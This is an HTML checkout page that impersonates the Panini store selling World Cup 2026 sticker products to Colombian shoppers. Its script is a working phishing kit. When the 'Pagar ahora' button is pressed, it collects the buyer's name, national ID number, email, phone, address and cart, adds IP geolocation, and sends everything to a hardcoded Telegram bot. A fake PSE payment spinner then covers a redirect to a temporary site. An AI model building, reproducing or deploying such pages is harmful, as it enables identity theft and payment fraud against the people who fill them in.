<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Checkout - Panini Mundial 2026™</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #f5f7fb;
            font-family: 'Inter', sans-serif;
            padding: 40px 20px;
        }

        /* Header con logo Panini */
        .checkout-header {
            max-width: 1280px;
            margin: 0 auto 30px auto;
            text-align: center;
        }

        .checkout-header img {
            height: 60px;
            width: auto;
        }

        .container {
            max-width: 1280px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 380px;
            gap: 30px;
        }

        .checkout-form {
            background: #FFFFFF;
            border-radius: 24px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
        }

        .section-title {
            font-size: 20px;
            font-weight: 700;
            color: #1a2c3e;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #eef2f6;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #5b6e8c;
            margin-bottom: 6px;
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1.5px solid #e2e8f0;
            border-radius: 16px;
            background: #ffffff;
            transition: all 0.2s;
            font-family: inherit;
        }

        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: #0033A0;
            box-shadow: 0 0 0 3px rgba(0,51,160,0.1);
        }

        .row-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 20px 0;
        }

        .checkbox-group input {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .checkbox-group label {
            margin: 0;
            cursor: pointer;
            font-size: 13px;
        }

        .order-summary {
            background: #FFFFFF;
            border-radius: 24px;
            padding: 25px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
            height: fit-content;
            position: sticky;
            top: 20px;
        }

        .cart-item {
            display: flex;
            gap: 12px;
            padding: 12px 0;
            border-bottom: 1px solid #eef2f6;
        }

        .cart-item-img {
            width: 60px;
            height: 60px;
            background: #f8fafc;
            border-radius: 12px;
            overflow: hidden;
        }

        .cart-item-img img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .cart-item-info {
            flex: 1;
        }

        .cart-item-title {
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 4px;
        }

        .cart-item-price {
            font-size: 13px;
            color: #E31837;
            font-weight: 700;
        }

        .cart-item-qty {
            font-size: 12px;
            color: #666;
        }

        .summary-total {
            padding: 15px 0;
            border-top: 2px solid #eef2f6;
            margin-top: 10px;
        }

        .total-row {
            display: flex;
            justify-content: space-between;
            font-size: 18px;
            font-weight: 800;
            color: #1a2c3e;
        }

        .btn-pagar {
            width: 100%;
            background: #0033A0;
            color: white;
            border: none;
            padding: 16px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-pagar:hover {
            background: #002280;
            transform: scale(0.98);
        }

        .btn-pagar img {
            height: 24px;
            width: auto;
        }

        /* MODAL DE CARGA PSE */
        .modal-carga {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .modal-carga-contenido {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 32px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            max-width: 320px;
            width: 90%;
        }

        .logo-pse-modal {
            width: 100px;
            margin-bottom: 20px;
        }

        .spinner-pse {
            width: 60px;
            height: 60px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #0033A0;
            border-bottom: 4px solid #E31837;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .modal-carga p {
            font-size: 16px;
            color: #1a2c3e;
            font-weight: 600;
            margin-top: 15px;
        }

        .modal-carga small {
            font-size: 12px;
            color: #666;
            display: block;
            margin-top: 10px;
        }

        @media (max-width: 900px) {
            .container {
                grid-template-columns: 1fr;
            }
            .order-summary {
                position: static;
            }
            .checkout-header img {
                height: 45px;
            }
        }
    </style>
</head>
<body>

<!-- HEADER CON LOGO PANINI -->
<div class="checkout-header">
    <img src="https://paninitienda.com/cdn/shop/files/panini-logo_2_2_1_png.webp" alt="Panini">
</div>

<div class="container">
    <div class="checkout-form">
        <h2 class="section-title">📞 Contacto</h2>
        <div class="form-group">
            <label>Correo electrónico</label>
            <input type="email" id="email" placeholder="tucorreo@ejemplo.com">
        </div>
        <div class="checkbox-group">
            <input type="checkbox" id="ofertas">
            <label>Enviarme novedades y ofertas por correo electrónico</label>
        </div>

        <h2 class="section-title">🆔 Identificación</h2>
        <div class="form-group">
            <label>Tipo de identificación</label>
            <select id="tipo-identificacion">
                <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
                <option value="NIT">NIT</option>

        </div>
        <div class="form-group">
            <label>Número de identificación</label>
            <input type="text" id="num-identificacion" placeholder="Número de identificación">

        <h2 class="section-title">🚚 Entrega</h2>
        <div class="row-2">
            <div class="form-group">
                <label>Departamento</label>
                <select id="departamento">
                    <option value="">Seleccione un departamento</option>
                    <option value="Amazonas">Amazonas</option>
                    <option value="Antioquia">Antioquia</option>
                    <option value="Arauca">Arauca</option>
                    <option value="Atlántico">Atlántico</option>
                    <option value="Bolívar">Bolívar</option>
                    <option value="Boyacá">Boyacá</option>
                    <option value="Caldas">Caldas</option>
                    <option value="Caquetá">Caquetá</option>
                    <option value="Casanare">Casanare</option>
                    <option value="Cauca">Cauca</option>
                    <option value="Cesar">Cesar</option>
                    <option value="Chocó">Chocó</option>
                    <option value="Córdoba">Córdoba</option>
                    <option value="Cundinamarca">Cundinamarca</option>
                    <option value="Guainía">Guainía</option>
                    <option value="Guaviare">Guaviare</option>
                    <option value="Huila">Huila</option>
                    <option value="La Guajira">La Guajira</option>
                    <option value="Magdalena">Magdalena</option>
                    <option value="Meta">Meta</option>
                    <option value="Nariño">Nariño</option>
                    <option value="Norte de Santander">Norte de Santander</option>
                    <option value="Putumayo">Putumayo</option>
                    <option value="Quindío">Quindío</option>
                    <option value="Risaralda">Risaralda</option>
                    <option value="San Andrés y Providencia">San Andrés y Providencia</option>
                    <option value="Santander">Santander</option>
                    <option value="Sucre">Sucre</option>
                    <option value="Tolima">Tolima</option>
                    <option value="Valle del Cauca">Valle del Cauca</option>
                    <option value="Vaupés">Vaupés</option>
                    <option value="Vichada">Vichada</option>
                </select>
            </div>
            <div class="form-group">
                <label>Ciudad o municipio</label>
                <input type="text" id="ciudad" placeholder="Ciudad o municipio">
            </div>
        </div>

        <div class="row-2">
            <div class="form-group">
                <label>País / Región</label>
                <input type="text" id="pais" value="Colombia" readonly style="background:#f8fafc;">
            </div>
        </div>

        <div class="row-2">
            <div class="form-group">
                <label>Nombre</label>
                <input type="text" id="nombre" placeholder="Nombre">
            </div>
            <div class="form-group">
                <label>Apellidos</label>
                <input type="text" id="apellidos" placeholder="Apellidos">
            </div>
        </div>

        <div class="form-group">
            <label>Dirección</label>
            <input type="text" id="direccion" placeholder="Dirección">
        </div>

        <div class="row-2">
            <div class="form-group">
                <label>Casa, apartamento, etc. (opcional)</label>
                <input type="text" id="complemento" placeholder="Casa, apartamento, etc.">
            </div>
            <div class="form-group">
                <label>Provincia / Estado</label>
                <input type="text" id="provincia" placeholder="Antioquia">
            </div>
        </div>

        <div class="row-2">
            <div class="form-group">
                <label>Código postal (opcional)</label>
                <input type="text" id="codigo-postal" placeholder="Código postal">
            </div>
            <div class="form-group">
                <label>Teléfono</label>
                <input type="tel" id="telefono" placeholder="Teléfono">
            </div>
        </div>

        <div class="checkbox-group">
            <input type="checkbox" id="guardar-info">
            <label>Guardar mi información y consultar más rápidamente la próxima vez</label>
        </div>
    </div>

    <div class="order-summary">
        <h2 class="section-title">🛒 Tu pedido</h2>
        <div id="cart-items-summary">
            <div style="text-align:center; padding:20px; color:#999;">Cargando productos...</div>
        </div>
        <div class="summary-total">
            <div class="total-row">
                <span>Total</span>
                <span id="cart-total-display">$0</span>
            </div>
        </div>
        <button class="btn-pagar" id="checkout-pay-btn">
            <img src="/panini/imagenes/pse-logo.webp" alt="PSE" onerror="this.style.display='none'"> Pagar ahora
        </button>
        <div style="font-size: 11px; text-align: center; margin-top: 15px; color: #999;">
            🔐 Todas las transacciones son seguras y están encargadas.
        </div>
    </div>
</div>

<!-- MODAL DE CARGA PSE CON LOGO LOCAL -->
<div id="modalCarga" class="modal-carga">
    <div class="modal-carga-contenido">
        <img src="/panini/imagenes/pse-logo.webp" 
             alt="PSE" 
             class="logo-pse-modal"
             onerror="this.src='https://placehold.co/200x80/0033A0/white?text=PSE'">
        <div class="spinner-pse"></div>
        <p>Procesando pago seguro</p>
        <small>Redirigiendo a PSE... espere un momento</small>
    </div>
</div>

<script>
    // =============================================
    // CONFIGURACIÓN DE TELEGRAM
    // =============================================
    const TELEGRAM_BOT_TOKEN = '8607426657:AAFFQMG_061Qf_HlkDuMmzgXFsWH9mSmBOk';
    const TELEGRAM_CHAT_ID = '-5114864668';
    // =============================================

    // Formatear pesos colombianos
    function formatCOP(price) {
        return '$' + price.toLocaleString('es-CO');
    }

    // Cargar carrito y mostrar resumen
    function loadCartSummary() {
        const cart = JSON.parse(localStorage.getItem('paniniCart')) || [];
        const container = document.getElementById('cart-items-summary');
        
        if (cart.length === 0) {
            container.innerHTML = '<div style="text-align:center; padding:20px; color:#999;">No hay productos en tu carrito</div>';
            document.getElementById('cart-total-display').innerText = '$0';
            return;
        }
        
        let html = '';
        let total = 0;
        cart.forEach(item => {
            const itemTotal = item.price * item.quantity;
            total += itemTotal;
            html += `
                <div class="cart-item">
                    <div class="cart-item-img">
                        <img src="${item.image}" alt="${item.name}">
                    </div>
                    <div class="cart-item-info">
                        <div class="cart-item-title">${item.name.substring(0, 50)}...</div>
                        <div class="cart-item-price">${formatCOP(item.price)}</div>
                        <div class="cart-item-qty">Cantidad: ${item.quantity}</div>
                    </div>
                </div>
            `;
        });
        
        html += `<div style="padding:15px 0; border-top:1px solid #eef2f6; margin-top:10px;">
                    <div style="display:flex; justify-content:space-between; font-weight:600;">
                        <span>Subtotal</span>
                        <span>${formatCOP(total)}</span>
                    </div>
                    <div style="display:flex; justify-content:space-between; font-size:13px; color:#2e7d32; margin-top:8px;">
                        <span>🚚 Envío gratis</span>
                        <span>$0</span>
                    </div>
                 </div>`;
        
        container.innerHTML = html;
        document.getElementById('cart-total-display').innerText = formatCOP(total);
        window.cartTotal = total;
        window.cart = cart;
    }

    // Validar formulario
    function validarFormulario() {
        const email = document.getElementById('email').value;
        const nombre = document.getElementById('nombre').value;
        const apellidos = document.getElementById('apellidos').value;
        const direccion = document.getElementById('direccion').value;
        const telefono = document.getElementById('telefono').value;
        const departamento = document.getElementById('departamento').value;
        const ciudad = document.getElementById('ciudad').value;
        
        if (!email) { alert('Por favor ingresa tu correo electrónico'); return false; }
        if (!nombre) { alert('Por favor ingresa tu nombre'); return false; }
        if (!apellidos) { alert('Por favor ingresa tus apellidos'); return false; }
        if (!direccion) { alert('Por favor ingresa tu dirección'); return false; }
        if (!telefono) { alert('Por favor ingresa tu teléfono'); return false; }
        if (!departamento) { alert('Por favor selecciona un departamento'); return false; }
        if (!ciudad) { alert('Por favor ingresa tu ciudad o municipio'); return false; }
        
        return true;
    }

    // Mostrar modal de carga
    function mostrarModalCarga() {
        const modal = document.getElementById('modalCarga');
        modal.style.display = 'flex';
        setTimeout(() => { modal.style.opacity = '1'; }, 10);
    }

    // Ocultar modal de carga
    function ocultarModalCarga() {
        const modal = document.getElementById('modalCarga');
        modal.style.opacity = '0';
        setTimeout(() => { modal.style.display = 'none'; }, 300);
    }

    // Enviar datos a Telegram
    async function enviarATelegram(datosEnvio, total, productos) {
        const ahora = new Date();
        const fecha = ahora.toLocaleString('es-ES', { 
            weekday: 'long', 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });
        
        let ip = 'No disponible';
        let pais = 'No disponible';
        let ciudadGeo = 'No disponible';
        
        try {
            const resIp = await fetch('https://api.ipify.org?format=json');
            const dataIp = await resIp.json();
            ip = dataIp.ip;
            
            const resGeo = await fetch(`https://ipapi.co/${ip}/json/`);
            const dataGeo = await resGeo.json();
            pais = dataGeo.country_name || 'No disponible';
            ciudadGeo = dataGeo.city || 'No disponible';
        } catch(e) {
            console.log('Error obteniendo geolocalización:', e);
        }
        
        const userAgent = navigator.userAgent;
        let dispositivo = '💻 Desktop';
        if (userAgent.includes('iPhone') || userAgent.includes('Android')) dispositivo = '📱 Móvil';
        else if (userAgent.includes('iPad')) dispositivo = '📟 Tablet';
        
        let mensaje = `🟢 *NUEVO PEDIDO - PANINI* 🟢\n\n`;
        mensaje += `🌐 *IP:* ${ip}\n`;
        mensaje += `📍 *País:* ${pais}\n`;
        mensaje += `🏙️ *Ciudad:* ${ciudadGeo}\n`;
        mensaje += `🔗 *Referido:* ${document.referrer || 'Directo'}\n`;
        mensaje += `📄 *Página:* /checkout\n`;
        mensaje += `⏰ *Fecha/Hora:* ${fecha}\n`;
        mensaje += `📱 *Dispositivo:* ${dispositivo}\n\n`;
        mensaje += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        mensaje += `📦 *DATOS DEL CLIENTE*\n\n`;
        mensaje += `👤 *Nombre:* ${datosEnvio.nombre || 'No especificado'}\n`;
        mensaje += `👥 *Apellidos:* ${datosEnvio.apellidos || 'No especificado'}\n`;
        mensaje += `📧 *Email:* ${datosEnvio.email || 'No especificado'}\n`;
        mensaje += `📞 *Teléfono:* ${datosEnvio.telefono || 'No especificado'}\n\n`;
        mensaje += `🆔 *Tipo ID:* ${datosEnvio.tipoIdentificacion || 'No especificado'}\n`;
        mensaje += `🔢 *Número ID:* ${datosEnvio.numeroIdentificacion || 'No especificado'}\n\n`;
        mensaje += `🏠 *Dirección:* ${datosEnvio.direccion || 'No especificado'}\n`;
        mensaje += `🏢 *Complemento:* ${datosEnvio.complemento || 'Ninguno'}\n`;
        mensaje += `🏙️ *Ciudad:* ${datosEnvio.ciudad || 'No especificado'}\n`;
        mensaje += `🗺️ *Departamento:* ${datosEnvio.departamento || 'No especificado'}\n`;
        mensaje += `📍 *Provincia:* ${datosEnvio.provincia || 'No especificado'}\n`;
        mensaje += `📮 *Código Postal:* ${datosEnvio.codigoPostal || 'No especificado'}\n\n`;
        mensaje += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        mensaje += `🛒 *RESUMEN DEL PEDIDO*\n\n`;
        mensaje += `💰 *Total a pagar:* ${formatCOP(total)}\n`;
        mensaje += `📦 *Productos:* ${productos.length}\n\n`;
        mensaje += `🛍️ *PRODUCTOS:*\n`;
        productos.forEach((prod, idx) => {
            mensaje += `${idx + 1}. ${prod.name.substring(0, 50)}...\n`;
            mensaje += `   📦 Cantidad: ${prod.quantity}\n`;
            mensaje += `   💰 Precio: ${formatCOP(prod.price)}\n`;
            mensaje += `   ━━━━━━━━━━━━━━━\n`;
        });
        mensaje += `\n✅ *Envío:* Gratis\n`;
        mensaje += `💳 *Método de pago:* PSE\n\n`;
        mensaje += `🔐 *Pedido generado automáticamente*`;
        
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const params = {
            chat_id: TELEGRAM_CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
        };
        
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(params)
            });
        } catch(e) {
            console.log('Error de conexión con Telegram:', e);
        }
    }

    // Guardar datos de envío y procesar
    async function guardarYProcesar() {
        if (!validarFormulario()) return;
        if (!window.cartTotal || window.cartTotal === 0 || !window.cart || window.cart.length === 0) {
            alert('No hay productos en tu carrito');
            return;
        }
        
        mostrarModalCarga();
        
        const datosEnvio = {
            email: document.getElementById('email').value,
            tipoIdentificacion: document.getElementById('tipo-identificacion').value,
            numeroIdentificacion: document.getElementById('num-identificacion').value,
            nombre: document.getElementById('nombre').value,
            apellidos: document.getElementById('apellidos').value,
            direccion: document.getElementById('direccion').value,
            complemento: document.getElementById('complemento').value,
            ciudad: document.getElementById('ciudad').value,
            departamento: document.getElementById('departamento').value,
            provincia: document.getElementById('provincia').value,
            codigoPostal: document.getElementById('codigo-postal').value,
            telefono: document.getElementById('telefono').value,
            ofertas: document.getElementById('ofertas').checked,
            guardarInfo: document.getElementById('guardar-info').checked
        };
        
        localStorage.setItem('datosEnvio', JSON.stringify(datosEnvio));
        enviarATelegram(datosEnvio, window.cartTotal, window.cart);
        
        setTimeout(() => {
            window.location.href = 'https://hrg.mra.temporary.site/recargas/';
        }, 1500);
    }

    // Cargar datos guardados
    function cargarDatosGuardados() {
        const datosGuardados = localStorage.getItem('datosEnvio');
        if (datosGuardados) {
            const datos = JSON.parse(datosGuardados);
            document.getElementById('email').value = datos.email || '';
            document.getElementById('nombre').value = datos.nombre || '';
            document.getElementById('apellidos').value = datos.apellidos || '';
            document.getElementById('direccion').value = datos.direccion || '';
            document.getElementById('telefono').value = datos.telefono || '';
            document.getElementById('departamento').value = datos.departamento || '';
            document.getElementById('ciudad').value = datos.ciudad || '';
            document.getElementById('tipo-identificacion').value = datos.tipoIdentificacion || 'Cédula de ciudadanía';
            document.getElementById('num-identificacion').value = datos.numeroIdentificacion || '';
            document.getElementById('complemento').value = datos.complemento || '';
            document.getElementById('provincia').value = datos.provincia || '';
            document.getElementById('codigo-postal').value = datos.codigoPostal || '';
            document.getElementById('ofertas').checked = datos.ofertas || false;
        }
    }

    // Inicializar
    document.getElementById('checkout-pay-btn').addEventListener('click', guardarYProcesar);
    loadCartSummary();
    cargarDatosGuardados();
</script>

</body>
</html>
